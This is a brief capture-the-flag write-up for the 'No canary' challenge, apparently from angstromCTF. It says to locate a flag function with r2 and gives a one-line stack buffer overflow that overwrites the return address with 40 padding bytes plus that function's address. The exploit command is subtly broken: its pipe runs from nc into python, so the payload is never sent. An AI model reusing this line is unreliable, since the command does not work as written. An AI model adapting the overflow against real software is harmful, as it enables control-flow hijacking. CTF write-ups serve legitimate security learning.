# No canary

Use r2 to find address of flag function, `0x00401186`  
Find buffer length needed.

```text
nc shell.actf.co 20700 | python -c 'print("A"*40+"\x86\x11\x40\x00\x00\x00\x00\x00")'
```

